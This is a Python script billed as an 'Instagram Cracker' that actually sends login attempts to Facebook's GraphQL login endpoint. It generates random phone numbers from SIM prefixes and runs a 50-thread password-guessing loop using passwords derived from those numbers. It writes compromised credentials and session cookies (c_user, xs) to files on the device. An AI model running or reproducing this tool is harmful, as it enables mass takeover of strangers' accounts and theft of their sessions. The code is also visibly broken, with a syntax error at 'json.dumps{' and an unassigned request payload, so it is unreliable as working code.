#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Instagram Cracker - Enhanced Version
Fixed and optimized with cloning functionality
Author: BITHIKA
Version: 2.0
"""

import random
import re
import json
import sys
import time
import hashlib
import json
import uuid
import urllib.request
import requests
import string
import os
import time,subprocess,platform,uuid
import random
import base64
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime 
# Global variables with proper initialization
loop = 0
oks = []
cps = []
idz = []
bkas = []

# Thread-safe locks
counter_lock = threading.Lock()
success_lock = threading.Lock()

def clear():
    """Cross-platform terminal screen clearing"""
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except Exception:
        # Fallback for systems without clear command
        print('\n' * 100)

def linex():
    """Print decorative line separator"""
    print(f"\033[1;97m{'='*56}")

def generate_device_hash(uid, pw):
    """Generate device hash for Instagram API"""
    hash_obj = hashlib.md5()
    hash_obj.update(f"{uid}{pw}".encode('utf-8'))
    hex_digest = hash_obj.hexdigest()
    hash_obj.update(f"{hex_digest}12345".encode('utf-8'))
    return hash_obj.hexdigest()

def save_success(uid, pw):
    """Thread-safe function to save successful login"""
    try:
        # Try SD card path first
        output_dir = "/sdcard/XYZ"
        fallback_dir = "XYZ"
        
        try:
            os.makedirs(output_dir, exist_ok=True)
            filepath = os.path.join(output_dir, "RANDOM_OK.txt")
        except (OSError, PermissionError):
            # Fallback to local directory
            os.makedirs(fallback_dir, exist_ok=True)
            filepath = os.path.join(fallback_dir, "RANDOM_OK.txt")
        
        with open(filepath, "a", encoding='utf-8') as f:
            f.write(f"{uid}|{pw}\n")
        
        # Thread-safe add to success list
        with success_lock:
            oks.append(uid)
            
    except Exception as e:
        print(f"\r\033[1;91m[Save Error] Failed to save result: {e}")

def crack(uid, password_list, total_count):
    """Enhanced Instagram account cracking function"""
    
    # Thread-safe counter increment
    with counter_lock:
        global loop,bkas
        
    
    colors = ["\033[1;90m", "\033[1;91m", "\033[1;92m", "\x1b[38;5;208m", 
              "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
    
    try:
        for pw in password_list:
            # Display progress
            color = random.choice(colors)
            with counter_lock:
                progress = loop
                success_count = len(oks)
                fail_count = len(cps)
                percentage = (progress / float(total_count) * 100) if total_count > 0 else 0
            
            sys.stdout.write(f"\r{color}[CRACKING] {progress} \033[1;92m{success_count}\033[1;97m/\033[1;91m{fail_count} \033[1;97m[\033[1;93m{percentage:.1f}%\033[1;97m]")
            sys.stdout.flush()
            
            # Create session and generate device hash    uid   "#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(pw)    str(uuid.uuid4()).upper(),
            session = requests.Session()
            head = {"authority": "m.prod.facebook.com",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "dpr": "3",
            "sec-ch-prefers-color-scheme": "light",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36 Edg/145.0.0.0',
            "viewport-width": "980"}
            response = session.get('https://www.facebook.com/login',headers=head)
            datr = response.cookies.get('datr')
            sb = response.cookies.get('sb')
            fr = response.cookies.get('fr')
            time_now = int(datetime.now().timestamp())
            enc_password = f"#PWD_BROWSER:0:{time_now}:{pw}"
            cookies = {
            'dpr': '2.75',
            'datr': datr,
            'sb': sb,
            'fr': fr,
            'wd': '980x1040',}
            response2 = session.get('https://touch.facebook.com')
            headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
            'sec-ch-ua-mobile': '?0',
            'viewport-width': '980',
            'x-fb-friendly-name': 'useCDSWebLoginMutation',
            'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(response2.text)).group(1),
            'x-asbd-id': '359341',
            'dpr': '2.75',
            'sec-ch-ua-full-version-list': '".Not/A)Brand";v="99.0.0.0", "Google Chrome";v="103.0.5060.129", "Chromium";v="103.0.5060.129"',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua-platform': '"Linux"',
            'origin': 'https://www.facebook.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.facebook.com/?_rdr',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',}
            {
    'av': '0',
    'aaid': '0',
    'user': '0',
    'a': '1',
    'req': 'c',
    'hs': '20565.HYP:comet_loggedout_pkg.2.1...0',
    'dpr': '3',
    'ccg': 'EXCELLENT',
    'rev': '1037867506',
    's': '6wzkon:pp3jyx:3mu9pe',
    'hsi': '7631436011182666178',
    'dyn': '7xeUmwlE7ibwKBAg5S1Dxu13w8CewSwMwNw9G2S0lW4o0B-q1ew6ywaq0yE7i0n24oaEd86a3a1YwBgao6C0Mo2swaO4U2zxe2GewbS361qw8Xxm16wa-0raazo7u0zE2ZwrU6qE15E6O1FwlA1HGp1yU5N90HwtU26wbu4o4W0he0oq0D8',
    'csr': 'jTd4scg8diQnpVkqAmpalDF6zayXADGdwDGaxe6o-cUyiXCy9oiGfxiiawwDg4im9BwionwoV9puvzEtzGwIwAx29x6324EZ4x615zo6aq0wA1Uw60wjE2Swj81ao2sw5gHojwg804Xi028C08vwMxu04EU2Iy827501757hQ11g019Vi00Oqg0FF1Gm1Ja2a07iU0-O042E0Vm5qxB1Lg0Y205A829g3mU0sWg8U04iq0v11qqjDg0mqgiG681a9oeF808jU88bS1YB806Bohw1r20iC',
    'hsdp': 'gk41P8zp0X3YgU0z67o0Qu0FU1kE0dDU0yW0yE3Ow',
    'hblp': '0b2093w57w27o2Dw5iw4ww4oyUvw13W0aGwb60dxwXw2bE2awfa2G1CwGxC781N810E3dwsUlwhE4a0E81zU4K',
    'sjsp': 'gk41P8zp0zNcfN3w2cotw',
    'comet_req': '15',
    'lsd': 'AdT38lQI_MPc68iJ_AemnMnnh80',
    'jazoest': '22243',
    'spin_r': '1037867506',
    'spin_b': 'trunk',
    'spin_t': '1776832158',
    'qpl_active_flow_ids': '516759801',
    'fb_api_caller_class': 'RelayModern',
    'fb_api_req_friendly_name': 'useCDSWebLoginMutation',
    'server_timestamps': 'true',
    'variables': json.dumps{
        "input": {
            "actor_id": "0",
            "client_mutation_id": "2",
            "access_flow_version": "pre_mt_behavior",
            "app": "facebook",
            "auth_domain_data_key": None,
            "caa_login_request_extra_info": {
                "ab_test_data": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAK",
                "shared_prefs_data": "eyIzMDAwMCI6W3sidCI6MTc3NjgzMjE2MC4yMzUsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbiJ9LCJ2IjpmYWxzZX1dLCIzMDAwMSI6W3sidCI6MTc3NjgzMjE2MC4yMzUsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbiJ9LCJ2IjowfV0sIjMwMDAyIjpbeyJ0IjoxNzc2ODMyMTYwLjIzNSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luIn0sInYiOjB9XSwiMzAwMDMiOlt7InQiOjE3NzY4MzIxNjAuMjM2LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4ifSwidiI6WyJlbi1JTiIsImVuLUdCIiwiZW4tVVMiLCJlbiJdfV0sIjMwMDA0IjpbeyJ0IjoxNzc2ODMyMTYwLjIzNiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luIn0sInYiOjMwMH1dLCIzMDAwNSI6W3sidCI6MTc3NjgzMjE2MC4yNTYsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbiJ9LCJ2Ijp7InciOjk4MCwiaCI6MTc5NX19XSwiMzAwMDciOlt7InQiOjE3NzY4MzIxNjAuMjU2LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4ifSwidiI6ImRlZmF1bHQifV0sIjMwMDA4IjpbeyJ0IjoxNzc2ODMyMTYwLjI5MiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luIn0sInYiOiJwcm9tcHQifV0sIjMwMDEyIjpbeyJ0IjoxNzc2ODMyMTYwLjI1OSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luIn0sInYiOiJHb29nbGUgSW5jLiJXSwiMzAwMTMiOlt7InQiOjE3NzY4MzIxNjAuMjYsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbiJ9LCJ2IjoiNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMy4wLjAuMCBTYWZhcmkvNTM3LjM2In1dLCIzMDAxNSI6W3sidCI6MTc3NjgzMjE2MC4yNiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luIn0sInYiOiJMaW51eCBhcm12OGwifV0sIjMwMDE4IjpbeyJ0IjoxNzc2ODMyMTYwLjI2MSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luIn0sInYiOjh9XSwiMzAwMjIiOlt7InQiOjE3NzY4MzIxNjAuMjcsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbiJ9LCJ2Ijp0cnVlfV0sIjMwMDQwIjpbeyJ0IjoxNzc2ODMyMTYwLjI3MSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luIn0sInYiOi0zMzB9XSwiMzAwOTMiOlt7InQiOjE3NzY4MzIxNjAuMjcxLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4ifSwidiI6NX1dLCIzMDA5NCI6W3sidCI6MTc3NjgzMjE2MC4yNzIsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbiJ9LCJ2IjoiTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTAzLjAuMC4wIFNhZmFyaS81MzcuMzYifV0sIjMwMDk1IjpbeyJ0IjoxNzc2ODMyMTYwLjI3MiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luIn0sInYiOjN9XSwiMzAxMDYiOlt7InQiOjE3NzY4MzIxNTkuODM0LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4ifSwidiI6ZmFsc2V9LHsidCI6MTc3NjgzMjE2MC4zODQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbiJ9LCJ2Ijp0cnVlfV0sIjMwMTA3IjpbeyJ0IjoxNzc2ODMyMTU5LjgzNiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luIn0sInYiOmZhbHNlfSx7InQiOjE3NzY4MzIxNjAuMzQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbiJ9LCJ2Ijp0cnVlfV19",
            "cuid": "",
            "guid": "f424dbe4a82b4d0cf",
            "jazoest": "22301",
            "lgndim": "eyJ3IjozOTMsImgiOjg1MSwiYXciOjM5MywiYWgiOjg1MSwiYyI6MjR9",
            "lgnjs": "1776832160",
            "lgnrnd": "212918_0AZj",
            "locale": "bn_IN",
            "login_source": "comet_headerless_login",
            "lsd":  re.search('name="lsd" value="(.*?)"',str(response2.text)).group(1),
            "next": "",
            "prefill_contact_point": "",
            "prefill_source": "",
            "prefill_type": "",
            "skstamp": "",
            "timezone": "-330"
        },
        "credential_type": "password",
        "dyi_job_id": "",
        "enc_password": {
            "sensitive_string_value": enc_password
        },
        "event_request_id": "bed64a47-935d-496c-8155-0df3a01eec31",
        "identifier": uid,
        "ig_web_device_id": None,
        "initial_request_id": "1",
        "lids": None,
        "login_source": "LOGIN",
        "next": None,
        "passkey_payload": None,
        "password": {
            "sensitive_string_value": enc_password
        },
        "persistent": True,
        "query_params": "{}",
        "trusted_device_records": "{}",
        "use_uid_to_login": False,
        "waterfall_id": "ad8438a3-c020-4019-97f2-ec5687242d8e"
    },
    'doc_id': '9807605492696448',
    'fb_api_analytics_tags': '["qpl_active_flow_ids=516759801"]',
}
            # Make API request
            response = session.post('https://www.facebook.com/api/graphql/', cookies=cookies, headers=headers, data=data)
            log_cookies = session.cookies.get_dict().keys()
            # Check response
            if "c_user" in log_cookies:
                #kuki = convert(session.cookies.get_dict())
                kuki=";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
                user = re.findall('c_user=(.*);xs', kuki)[0]
                ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    print('\033[1;92m OK '+user+'|'+pw+'')
                    print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
                    open("/sdcard/SUMON_RANDOM_IDS.txt","a").write(user+"|"+pw+"|"+kuki+"\n")
                    oks.append(user)
                    continue
            elif 'checkpoint' in log_cookies:
                print(f"\r\033[1;93m [⚠ SUMON_CP] {uid} | {pw}")
                open("/sdcard/SUMON_file_2f.txt", "a").write(f"{uid}|{pw}\n")
                cps.append(uid+"|"+pw)
                continue
            else:
                #print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                continue
        loop += 1
    except requests.exceptions.Timeout:
        #print(f"\r\033[1;91m [Timeout] {uid} - Request timed out")
        return False
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        return False
    except requests.exceptions.RequestException as e:
        #print(f"\r\033[1;91m [Request Error] {uid} - {str(e)[:50]}")
        return False
    except KeyboardInterrupt:
        #print(f"\r\033[1;93m [Interrupted] User stopped the process")
        raise
    except Exception as e:
        #print(f"\r\033[1;91m [Unexpected Error] {uid} - {str(e)[:50]}")
        return False
    
    return False


def generate_random_ids(limit):
    """Generate random 6-digit IDs"""
    idz.clear()
    for _ in range(limit):
        random_id = "".join(random.choice(string.digits) for _ in range(6))
        idz.append(random_id)
    return idz

def get_password_patterns(uid):
    """Generate password patterns based on UID"""
    return [
        uid[:6],     # First 6 digits
        uid[:8],     # First 8 digits
        uid,         # Full number
    ]

def random_number():
    """Main random number cloning function"""
    clear()
    
    print(f"\033[1;96m{'='*56}")
    print(f"\033[1;96m     🎯 INSTAGRAM RANDOM NUMBER CLONING 🎯")
    print(f"\033[1;96m{'='*56}")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Available Codes: \033[1;92m7679, 7872, 9883, 8017")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Suggested Limits: \033[1;92m1000, 2000, 5000, 10000")
    linex()
    
    # Get user input
    code = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter SIM Code: \033[1;92m").strip()
    # get user limit
    try:
        limit = int(input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Limit: \033[1;92m"))
        if limit <= 0:
            raise ValueError
    except ValueError:
        print(f" \033[1;91m[!] Invalid limit. Using default: 99999")
        limit = 99999
        time.sleep(2)
    
    # Generate random IDs
    print(f" \033[1;93m[*] Generating {limit} random IDs...")
    generate_random_ids(limit)
    
    # Reset global counters
    global loop, oks, cps
    with counter_lock:
        loop = 0
    with success_lock:
        oks.clear()
    cps.clear()
    
    # Display start information
    clear()
    print(f"\033[1;96m{'='*56}")
    print(f"\033[1;96m     🔥 STARTING INSTAGRAM CLONING 🔥")
    print(f"\033[1;96m{'='*56}")
    print(f' \033[1;32m(✓) \033[1;37mTotal IDs Generated: \033[1;32m{len(idz):,}')
    print(f' \033[1;35m(+) \033[1;37mSIM Code: \033[1;32m{code}')
    print(f" \x1b[38;5;208m(!) \x1b[38;5;205mTip: Use Flight Mode for better speed!")
    print(f' \033[1;33m[•] \033[1;37mResults will be saved to: \033[1;32mXYZ/RANDOM_OK.txt')
    linex()
    
    # Start multi-threaded attack
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = []
        
        for random_id in idz:
            uid = code + random_id
            password_patterns = get_password_patterns(uid)
            future = executor.submit(crack, uid, password_patterns, len(idz))
            futures.append(future)
        
        # Wait for all tasks to complete
        for future in as_completed(futures):
            try:
                future.result()
            except KeyboardInterrupt:
                print(f"\n\033[1;93m[!] Interrupted by user. Shutting down...")
                executor.shutdown(wait=False)
                return
            except Exception as e:
                print(f"\n\033[1;91m[!] Task failed: {e}")
    
    # Calculate execution time
    end_time = time.time()
    execution_time = end_time - start_time
    
    # Display results
    linex()
    print(f"\033[1;92m{'='*56}")
    print(f" \033[1;92m[✓] PROCESS COMPLETED SUCCESSFULLY!")
    print(f"\033[1;92m{'='*56}")
    print(f" \033[1;97m[📊] Total Accounts Tested: \033[1;92m{len(idz):,}")
    print(f" \033[1;97m[✅] Successful Logins: \033[1;92m{len(oks)}")
    print(f" \033[1;97m[❌] Failed Attempts: \033[1;91m{len(cps)}")
    print(f" \033[1;97m[⏱️] Execution Time: \033[1;93m{execution_time:.2f} seconds")
    print(f" \033[1;97m[🚀] Speed: \033[1;94m{len(idz)/execution_time:.2f} IDs/second")
    
    if len(oks) > 0:
        print(f" \033[1;92m[🎉] SUCCESS! Found {len(oks)} working accounts!")
    else:
        print(f" \033[1;91m[😞] No successful logins found this time.")
    
    linex()
    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to return to menu...")

def menu():
    """Interactive main menu"""
    while True:
        clear()
        print(f"\033[1;96m{'='*56}")
        print(f"\033[1;96m     🚀 INSTAGRAM CRACKER v2.0 - ENHANCED 🚀")
        print(f"\033[1;96m{'='*56}")
        print(f" \033[1;97m[\033[1;92m1\033[1;97m] 🎯 Random Number Cloning")
        print(f" \033[1;97m[\033[1;92m2\033[1;97m] 📊 View Statistics")
        print(f" \033[1;97m[\033[1;92m3\033[1;97m] ❌ Exit Program")
        print(f"\033[1;96m{'='*60}")
        
        choice = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option: \033[1;92m").strip()
        
        if choice == '1':
            random_number()
        elif choice == '2':
            clear()
            print(f"\033[1;96m{'='*56}")
            print(f"\033[1;96m     📊 PROGRAM STATISTICS 📊")
            print(f"\033[1;96m{'='*56}")
            print(f" \033[1;97m[✅] Total Successful: \033[1;92m{len(oks)}")
            print(f" \033[1;97m[❌] Total Failed: \033[1;91m{len(cps)}")
            print(f" \033[1;97m[📝] Generated IDs: \033[1;93m{len(idz)}")
            print(f" \033[1;97m[🔄] Current Progress: \033[1;94m{loop}")
            linex()
            input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to continue...")
        elif choice == '3':
            clear()
            print(f"\033[1;92m{'='*56}")
            print(f" \033[1;92m     👋 GOODBYE! THANKS FOR USING OUR TOOL! 👋")
            print(f"\033[1;92m{'='*56}")
            print(f" \033[1;93m[!] Results saved in: XYZ/RANDOM_OK.txt")
            print(f" \033[1;93m[!] Total successful accounts: {len(oks)}")
            time.sleep(3)
            break
        else:
            print(f" \033[1;91m[!] Invalid option! Please choose 1, 2, or 3.")
            time.sleep(2)

if __name__ == "__main__":
    try:
        # Check for required modules
        required_modules = ['requests', 'urllib.request']
        missing_modules = []
        
        for module in required_modules:
            try:
                __import__(module)
            except ImportError:
                missing_modules.append(module)
        
        if missing_modules:
            print(f"\033[1;91m[!] Missing required modules: {', '.join(missing_modules)}")
            print(f"\033[1;91m[!] Please install them using: pip install {' '.join(missing_modules)}")
            sys.exit(1)
        
        # Start the main menu
        menu()
        
    except KeyboardInterrupt:
        clear()
        print(f"\n\033[1;93m[!] Program interrupted by user. Goodbye!")
        sys.exit(0)
    except Exception as e:
        clear()
        print(f"\n\033[1;91m[!] Fatal error occurred: {e}")
        sys.exit(1)
